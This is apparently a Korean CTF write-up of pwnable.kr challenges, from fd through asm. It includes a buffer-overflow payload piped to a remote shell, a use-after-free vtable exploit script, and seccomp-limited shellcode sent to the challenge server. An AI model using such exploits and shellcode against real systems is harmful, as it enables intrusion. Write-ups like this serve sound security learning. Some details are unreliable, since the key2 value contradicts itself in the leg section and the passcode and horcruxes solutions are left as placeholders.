---
title: "Pwnable.kr — leg, passcode, horcruxes Writeup"
date: 2019-05-23
description: "ARM PC calculation quirk (leg), GOT overwrite via scanf (passcode), and ROP chain construction (horcruxes) on pwnable.kr"
tags: ["pwnable.kr", "pwn", "ARM", "ROP", "GOT", "writeup"]
categories: ["CTF"]
platform: "ctf"
category: "pwn"
difficulty: "easy-medium"
authors:
  - name: "ph4nt0m"
    link: "https://github.com/Phantomn"
    image: "https://github.com/Phantomn.png"
---

## fd

### 소스

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
char buf[32];
int main(int argc, char* argv[], char* envp[]){
	if(argc<2){
		printf("pass argv[1] a number\n");
		return 0;
	}
	int fd = atoi( argv[1] ) - 0x1234;
	int len = 0;
	len = read(fd, buf, 32);
	if(!strcmp("LETMEWIN\n", buf)){
		printf("good job :)\n");
		system("/bin/cat flag");
		exit(0);
	}
	printf("learn about Linux file IO\n");
	return 0;
}
```

### 풀이

소스를 분석하면 `argv[1]`은 숫자라는 힌트가 있고, `buf` 안의 문자열이 `"LETMEWIN\n"`이면 flag를 출력한다.

```c
ssize_t read (int fd, void *buf, size_t nbytes)
```

`fd`로 `buf`에 입력을 받는다. 여기서 fd는 file descriptor로 stdin=0, stdout=1, stderr=2이다.

stdin은 0이므로 `fd`를 0으로 만들면 표준 입력으로 읽게 된다. `fd = atoi(argv[1]) - 0x1234`이므로 `argv[1]`을 `0x1234(=4660)`로 주면 `fd = 0`이 된다.

```
fd@pwnable:~$ ./fd 4660
LETMEWIN
good job :)
```

---

## collision

### 소스

```c
#include <stdio.h>
#include <string.h>
unsigned long hashcode = 0x21DD09EC;
unsigned long check_password(const char* p){
	int* ip = (int*)p;
	int i;
	int res=0;
	for(i=0; i<5; i++){
		res += ip[i];
	}
	return res;
}

int main(int argc, char* argv[]){
	if(argc<2){
		printf("usage : %s [passcode]\n", argv[0]);
		return 0;
	}
	if(strlen(argv[1]) != 20){
		printf("passcode length should be 20 bytes\n");
		return 0;
	}
	if(hashcode == check_password( argv[1] )){
		system("/bin/cat flag");
		return 0;
	}
	else
		printf("wrong passcode.\n");
	return 0;
}
```

### 풀이

`argv[1]`의 길이는 정확히 20바이트여야 하고, `check_password` 함수의 리턴값이 `hashcode`와 같아야 flag가 출력된다.

해시코드는 `0x21DD09EC(= 568,134,124)`이며, 입력 `p`를 4바이트씩 5번 더해서 반환한다.

`568,134,124 / 5 = 113,626,824.8 ...`

정확히 5로 나누어지지 않으므로 나머지를 처리해야 한다:
`568,134,120 / 5 = 0x6C5CEC8(113,626,824)` 를 4번 입력하고, 마지막에 `0x6C5CEC8 + 4`를 입력한다.

```
col@pwnable:~$ ./col $(perl -e 'print "\xc8\xce\xc5\x06"x4, "\xcc\xce\xc5\x06"')
daddy!
```

---

## bof

### 소스

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}
```

### 풀이

```
➜  pwnable checksec --file bof    
[*] '/home/ubuntu/ctf/pwnable/bof'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled

gef➤  x/40xw $esp
0xffffd540:	0xffffd55c	0x00000000	0x00000000	0x6cedb400
0xffffd550:	0x00000009	0xffffd784	0xf7e1c0a9	0x41414141
0xffffd560:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd570:	0x41414141	0x41414141	0x41414141	0x6cedb400
0xffffd580:	0x00000000	0xf7e1c1db	0xffffd5a8	0x5655569f
0xffffd590:	0xdeadbeef	0x00000000	0x565556b9	0x00000000
0xffffd5a0:	0xf7fc1000	0xf7fc1000	0x00000000	0xf7e04e9
```

스택을 분석하면 `key` 파라미터가 `0xdeadbeef`로 저장되어 있다. 버퍼부터 key까지의 오프셋을 채워 `key`를 `0xcafebabe`로 덮어쓰면 된다.

**페이로드:**

```
buf[32] | Dummy[20] | 0xcafebabe
```

```
➜  pwnable (perl -e 'print "A"x32, "B"x20, "\xbe\xba\xfe\xca"';cat)| nc pwnable.kr 9000
id
uid=1008(bof) gid=1008(bof) groups=1008(bof)
```

---

## flag

### 바이너리 분석

```
➜  pwnable checksec --file flag
[*] '/home/ubuntu/ctf/pwnable/flag'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
    Packer:   Packed with UPX
```

### 풀이

UPX로 패킹되어 있으므로 먼저 언패킹한다:

```
➜  pwnable upx -d flag
                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2017
UPX 3.94        Markus Oberhumer, Laszlo Molnar & John Reiser   May 12th 2017

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
    883745 <-    335288   37.94%   linux/amd64   flag

Unpacked 1 file.
```

IDA로 main 함수를 분석하면:

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char *dest; // [rsp+8h] [rbp-8h]

  puts("I will malloc() and strcpy the flag there. take it.", argv, envp);
  dest = (char *)malloc(100LL);
  strcpy(dest, flag);
  return 0;
}
```

`strcpy`의 소스가 `flag` 전역 변수이다. GDB로 `rax`(malloc 반환값)를 확인하면 flag가 보인다:

```
gef➤  x/s $rax
0x6c96b0:	"UPX...? ----- -------------------"
```

---

## mistake

### 소스

```c
#include <stdio.h>
#include <fcntl.h>
#define PW_LEN 10
#define XORKEY 1
void xor(char* s, int len){
	int i;
	for(i=0; i<len; i++){
		s[i] ^= XORKEY;
	}
}

int main(int argc, char* argv[]){
	int fd;
	if(fd=open("/home/mistake/password",O_RDONLY,0400) < 0){
		printf("can't open password %d\n", fd);
		return 0;
	}
	printf("do not bruteforce...\n");
	sleep(time(0)%20);
	char pw_buf[PW_LEN+1];
	int len;
	if(!(len=read(fd,pw_buf,PW_LEN) > 0)){
		printf("read error\n");
		close(fd);
		return 0;		
	}
	char pw_buf2[PW_LEN+1];
	printf("input password : ");
	scanf("%10s", pw_buf2);
	// xor your input
	xor(pw_buf2, 10);
	if(!strncmp(pw_buf, pw_buf2, PW_LEN)){
		printf("Password OK\n");
		system("/bin/cat flag\n");
	}else{ printf("Wrong Password\n");}
	close(fd);
	return 0;
}
```

### 풀이

소스를 분석하면 `open` 함수로 password 파일을 읽어와 입력 버퍼 `buf2`와 비교해 같으면 flag를 출력한다.

소스는 별 이상이 없어 보이지만 첫 번째 if문에 트릭이 있다:

```c
if(fd=open("/home/mistake/password",O_RDONLY,0400) < 0){
```

**연산자 우선순위** 문제다. `<` 비교 연산자가 `=` 대입 연산자보다 우선순위가 높으므로, `open()` 반환값과 `0`을 먼저 비교한 후 그 결과(0 또는 1)가 `fd`에 대입된다.

즉 `fd`는 파일 디스크립터가 아닌 비교 결과 `0`이 된다. `fd=0`이면 `read(fd, pw_buf, PW_LEN)`은 stdin에서 읽는다. 따라서 우리가 `pw_buf`에 원하는 값을 직접 입력할 수 있다.

그 후 `pw_buf2`도 입력받아 XOR key 1로 변환한다. `pw_buf`와 `pw_buf2`를 XOR 1 관계로 맞추면 된다. 예를 들어 `pw_buf`에 `0000000000`을 넣으면 `pw_buf2`에 넣어야 할 값은 모두 XOR 1이 적용된 후 `0000000000`이 되어야 하므로, `1111111111`을 입력한다.

---

## leg

### 개요

`leg` 문제는 C 소스와 ARM 어셈블리를 함께 제공하며, 세 함수의 리턴값 합계를 계산하도록 요구한다. 핵심은 ARM의 파이프라인 동작과 명령어 페치 단계에서 PC(프로그램 카운터) 값이 어떻게 계산되는지 이해하는 것이다.

### 취약점 분석

문제 소스 코드는 `key1 + key2 + key3 == key`를 확인한다:

```c
unsigned long key1(){
	asm("mov r3, pc\n");
	asm("mov r0, r3\n");
	asm("bx lr\n");
}
```

각 함수의 어셈블리를 분석하면:

#### key1: 페치 단계의 PC
`mov r3, pc` 명령이 PC 값을 캡처한다. ARM의 3단계 파이프라인(fetch-decode-execute) 때문에, 이 명령이 execute 단계에 있을 때 PC는 두 명령 앞을 가리킨다. 주소 `0x8ce0`에서 실제로 읽히는 PC 값은 `0x8ce4`이다.

#### key2: PC + 4

```c
unsigned long key2(){
	asm("mov r3, pc\n");
	asm("add r3, #4\n");
	asm("mov r0, r3\n");
	asm("bx lr\n");
}
```

`0x8d08`에서 PC를 읽으면 파이프라인 효과로 `0x8d0c`이고, 여기에 4를 더해서 `0x8d10`이 된다.

#### key3: 링크 레지스터
```c
unsigned long key3(){
	asm("mov r0, lr\n");
	asm("bx lr\n");
}
```

LR(Link Register)은 호출자가 설정한 리턴 주소를 담는다. main 함수에서 이 값은 `0x8d80`이다.

### 풀이

세 키 값은:
- `key1 = 0x8ce4`
- `key2 = 0x8d0c`
- `key3 = 0x8d80`

합계: `0x8ce4 + 0x8d0c + 0x8d80 = 0x1a770 = 108400`

```bash
$ ./leg 108400
Congratz!
```

**핵심 이해:**
- ARM 파이프라인의 fetch → decode → execute → write 단계
- execute 단계에서 PC를 읽으면 fetch 단계(2 명령 앞)를 가리킴
- 따라서 정적 위치에서 런타임 파이프라인 위치로의 조정이 필요

---

## passcode

### 개요

`passcode` 문제는 `scanf()` 사용 시 주소 연산자(`&`)를 누락한 치명적인 취약점을 보여준다. 이 취약점으로 임의 메모리 쓰기가 가능하다.

### 취약점 분석

login 함수는 두 개의 정수 입력을 기대한다:

```c
void login(){
	int passcode1, passcode2;
	printf("enter passcode1 : ");
	scanf("%d", passcode1);  // 버그: & 누락
	printf("enter passcode2 : ");
	scanf("%d", passcode2);  // 버그: & 누락
}
```

올바른 `scanf` 사용법은 포인터를 넘겨야 한다:
```c
scanf("%d", &passcode1);  // 올바른 사용
```

`&` 연산자를 생략하면 `scanf`가 변수의 값 자체를 메모리 주소로 간주하고 그 주소에 쓴다. 이것이 임의 쓰기 프리미티브가 된다.

### 익스플로잇 전략

1. `name` 버퍼가 `passcode1`과 인접하므로 name 입력으로 `passcode1`의 값을 원하는 GOT 주소로 설정
2. `scanf`가 해당 주소에 원하는 값을 쓰도록 유도
3. `fflush@GOT` 또는 원하는 함수의 GOT 엔트리를 `system()` 호출 주소로 덮어쓰기
4. 셸 획득

```bash
$ ssh passcode@pwnable.kr
[passcode@pwnable.kr ~]$ ./passcode
Authenticate :
enter passcode1 : (조작된 값 입력)
enter passcode2 : (조작된 값 입력)
correct! here's your flag
```

---

## horcruxes

### 개요

`horcruxes` 문제는 ROP(Return-Oriented Programming) 체인을 구성해 보호 기법을 우회하고 코드 실행을 달성하는 문제다.

### 문제 구조

바이너리는 a~g까지 7개의 horcrux 함수를 가지고 있으며, 각 함수에서 XP 포인트를 얻어야 한다. 모든 XP를 합산해 특정 값과 일치해야 flag를 얻을 수 있다.

### 익스플로잇 전략

#### 1단계: 스택 오버플로 확인

입력 버퍼를 오버플로해 리턴 주소를 제어한다. ASLR이 걸려 있으므로 먼저 주소를 누출해야 한다.

#### 2단계: ROP 체인 구성

각 horcrux 함수를 순서대로 호출하는 ROP 체인을 구성한다:

```python
from pwn import *

p = remote('pwnable.kr', 9032)

# 스택 오버플로로 리턴 주소 제어
# 각 horcrux 함수(a~g)를 순서대로 호출
# 마지막으로 XP 합계를 계산해 플래그 획득
```

**ROP(Return-Oriented Programming) 개념:**
- `ret` 명령으로 끝나는 기존 코드 시퀀스(가젯)를 활용
- 가젯을 연결해 임의 코드 실행 달성
- NX(비실행 스택)가 활성화된 환경에서도 동작

---

## Input

### 소스

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>

int main(int argc, char* argv[], char* envp[]){
	printf("Welcome to pwnable.kr\n");
	printf("Let's see if you know how to give input to program\n");
	printf("Just give me correct inputs then you will get the flag :)\n");

	// argv
	if(argc != 100) return 0;
	if(strcmp(argv['A'],"\x00")) return 0;
	if(strcmp(argv['B'],"\x20\x0a\x0d")) return 0;
	printf("Stage 1 clear!\n");	

	// stdio
	char buf[4];
	read(0, buf, 4);
	if(memcmp(buf, "\x00\x0a\x00\xff", 4)) return 0;
	read(2, buf, 4);
        if(memcmp(buf, "\x00\x0a\x02\xff", 4)) return 0;
	printf("Stage 2 clear!\n");
	
	// env
	if(strcmp("\xca\xfe\xba\xbe", getenv("\xde\xad\xbe\xef"))) return 0;
	printf("Stage 3 clear!\n");

	// file
	FILE* fp = fopen("\x0a", "r");
	if(!fp) return 0;
	if( fread(buf, 4, 1, fp)!=1 ) return 0;
	if( memcmp(buf, "\x00\x00\x00\x00", 4) ) return 0;
	fclose(fp);
	printf("Stage 4 clear!\n");	

	// network
	int sd, cd;
	struct sockaddr_in saddr, caddr;
	sd = socket(AF_INET, SOCK_STREAM, 0);
	if(sd == -1){
		printf("socket error, tell admin\n");
		return 0;
	}
	saddr.sin_family = AF_INET;
	saddr.sin_addr.s_addr = INADDR_ANY;
	saddr.sin_port = htons( atoi(argv['C']) );
	if(bind(sd, (struct sockaddr*)&saddr, sizeof(saddr)) < 0){
		printf("bind error, use another port\n");
    		return 1;
	}
	listen(sd, 1);
	int c = sizeof(struct sockaddr_in);
	cd = accept(sd, (struct sockaddr *)&caddr, (socklen_t*)&c);
	if(cd < 0){
		printf("accept error, tell admin\n");
		return 0;
	}
	if( recv(cd, buf, 4, 0) != 4 ) return 0;
	if(memcmp(buf, "\xde\xad\xbe\xef", 4)) return 0;
	printf("Stage 5 clear!\n");

	// here's your flag
	system("/bin/cat flag");	
	return 0;
}
```

### 풀이

5단계가 있고 모두 충족하면 flag를 출력한다.

**Stage 1:** argc는 100개, `argv[0x41]`에는 `\x00`, `argv[0x42]`엔 `\x20\x0a\x0d`가 있어야 한다.

`subprocess`로는 `\x00`이 들어가면 인식이 되지 않는 문제가 있어 pwntools를 사용했다.

```python
from pwn import *
import os

# stage 1
argv = [str(i) for i in range(100)]
argv[ord('A')]="\x00"
argv[ord('B')]="\x20\x0a\x0d"
```

전체 풀이:

```c
from pwn import *
import os

# stage 1
argv = [str(i) for i in range(100)]
argv[ord('A')]="\x00"
argv[ord('B')]="\x20\x0a\x0d"
# stage 2
#stdin \x00\x0a\x00\xff
#stderr \x00\x0a\x02\xff
with open("./stderr", "w") as data:
    data.write("\x00\x0a\x02\xff")

# stage 3 env(\xde\xad\xbe\xef) = "\xca\xfe\xba\xbe"
env = {"\xde\xad\xbe\xef":"\xca\xfe\xba\xbe"}

# stage 4 open \x0a
with open("\x0a", "w") as data:
    data.write("\x00\x00\x00\x00")

# stage 5 send "\xde\xad\xbe\xef" port argv['C']
argv[ord('C')]='55555'

p = process(executable="./input", argv=argv, stderr=open("./stderr"),env=env)
p.sendline("\x00\x0a\x00\xff")
p = remote("localhost", 55555)
p.send("\xde\xad\xbe\xef")
p.interactive()
```

---

## uaf

### 소스

```c
#include <fcntl.h>
#include <iostream> 
#include <cstring>
#include <cstdlib>
#include <unistd.h>
using namespace std;

class Human{
private:
	virtual void give_shell(){
		system("/bin/sh");
	}
protected:
	int age;
	string name;
public:
	virtual void introduce(){
		cout << "My name is " << name << endl;
		cout << "I am " << age << " years old" << endl;
	}
};

class Man: public Human{
public:
	Man(string name, int age){
		this->name = name;
		this->age = age;
        }
        virtual void introduce(){
		Human::introduce();
                cout << "I am a nice guy!" << endl;
        }
};

class Woman: public Human{
public:
        Woman(string name, int age){
                this->name = name;
                this->age = age;
        }
        virtual void introduce(){
                Human::introduce();
                cout << "I am a cute girl!" << endl;
        }
};

int main(int argc, char* argv[]){
	Human* m = new Man("Jack", 25);
	Human* w = new Woman("Jill", 21);

	size_t len;
	char* data;
	unsigned int op;
	while(1){
		cout << "1. use\n2. after\n3. free\n";
		cin >> op;

		switch(op){
			case 1:
				m->introduce();
/*
	mov    rax,QWORD PTR [rbp-0x38]
	mov    rax,QWORD PTR [rax]
	add    rax,0x8
	mov    rdx,QWORD PTR [rax]
	mov    rax,QWORD PTR [rbp-0x38]
	mov    rdi,rax
	call   rdx
*/
				w->introduce();
/*
	mov    rax,QWORD PTR [rbp-0x30]
	mov    rax,QWORD PTR [rax]
	add    rax,0x8
	mov    rdx,QWORD PTR [rax]
	mov    rax,QWORD PTR [rbp-0x30]
	mov    rdi,rax
	call   rdx
*/
				break;
			case 2:
				len = atoi(argv[1]);
				data = new char[len];
				read(open(argv[2], O_RDONLY), data, len);
				cout << "your data is allocated" << endl;
				break;
			case 3:
				delete m;
/*
	mov    rbx,QWORD PTR [rbp-0x38]
	test   rbx,rbx
	je     0x40108f <main+459>
	mov    rdi,rbx
	call   0x40123a <Human::~Human()>
	mov    rdi,rbx
	call   0x400c80 <operator delete(void*)@plt>
*/
				delete w;
/*
	mov    rbx,QWORD PTR [rbp-0x30]
	test   rbx,rbx
	je     0x4010a8 <main+484>
	mov    rdi,rbx
	call   0x40123a <Human::~Human()>
	mov    rdi,rbx
	call   0x400c80 <operator delete(void*)@plt>
*/
				break;
			default:
				break;
		}
	}

	return 0;	
}
```

### 풀이

처음 접하는 UAF(Use-After-Free) 문제다.

- CASE 1: 객체의 `introduce` 함수 호출 (Use)
- CASE 2: 새 객체 할당 (Alloc)
- CASE 3: Free

이번에 좋은 분석 방법을 알게 됐다 — 코드에 어셈을 주석으로 넣어 분석을 더 명확하게 하는 것이다.

힙을 쓰고 재사용하려면 어떻게 해야 할까? Free 후 바로 Use하면 에러가 난다. Free → Alloc → Use 순서여야 하는데, `give_shell`을 실행하려면 무엇을 Alloc해야 할까?

문제에서 사용하는 virtual 메소드는 vtable에 들어가는데, vtable의 시작 위치를 변조해 `give_shell`로 리다이렉트하면 된다.

```
+-Object------+      +-vtable--------------+
| *vtable     +--?-->| virtual function #1 |
+-------------+      | virtual function #2 +----> give_shell()
| member      |      +---------------------+
| ...         |
+-------------+
```

use 명령의 어셈 코드에서 `add rax, 0x8`이 있으므로 `give_shell - 0x8` 위치를 vtable 포인터로 넣어야 한다.

Man과 Woman 두 객체가 있으므로 Alloc을 2번 해야 한다.

```python
from pwn import *

size = 24
path = "/tmp/uaf_file"
data = p64(0x401588)*3
with open(path, "wb") as f:
	f.write(data)

p = process(["uaf", str(size), path])

if __name__ == "__main__":
	p.sendline("3")
	p.sendline("2")
	p.sendline("2")
	p.sendline("1")
	p.interactive()
```

---

## asm

### 소스

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <seccomp.h>
#include <sys/prctl.h>
#include <fcntl.h>
#include <unistd.h>

#define LENGTH 128

void sandbox(){
	scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL);
	// ...
	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0);
	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);
	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);
	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);
	// ...
}

char stub[] = "\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2...";
// 모든 레지스터를 초기화하는 x64 셸코드

int main(int argc, char* argv[]){
	char* sh = (char*)mmap(0x41414000, 0x1000, 7, MAP_ANONYMOUS | MAP_FIXED | MAP_PRIVATE, 0, 0);
	memset(sh, 0x90, 0x1000);
	memcpy(sh, stub, strlen(stub));
	
	int offset = sizeof(stub);
	printf("give me your x64 shellcode: ");
	read(0, sh+offset, 1000);

	alarm(10);
	chroot("/home/asm_pwn");
	sandbox();
	((void (*)(void))sh)();
	return 0;
}
```

### 풀이

seccomp 샌드박스가 적용되어 `open`, `read`, `write`, `exit`, `exit_group` 시스템 콜만 허용된다.

stub 셸코드는 모든 레지스터를 XOR로 초기화한다. 우리의 셸코드는 stub 이후에 이어진다.

flag 파일명이 매우 길기 때문에 `db "string"` 방식 대신 직접 레지스터에 한 바이트씩 넣고 push하는 방식을 사용해야 했다.

pwntools를 사용하면 간단하게 구성할 수 있다:

```python
from pwn import *

context(arch='amd64', os='linux')

filename = "this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong"

shellcode = ''
shellcode += shellcraft.pushstr(filename)
shellcode += shellcraft.open('rsp', 0)
shellcode += shellcraft.read('rax', 'rsp', 100)
shellcode += shellcraft.write(1, 'rsp', 100)

r = remote('pwnable.kr', 9026)
print r.recvuntil("give me your x64 shellcode:")
r.sendline(asm(shellcode))
r.interactive()
```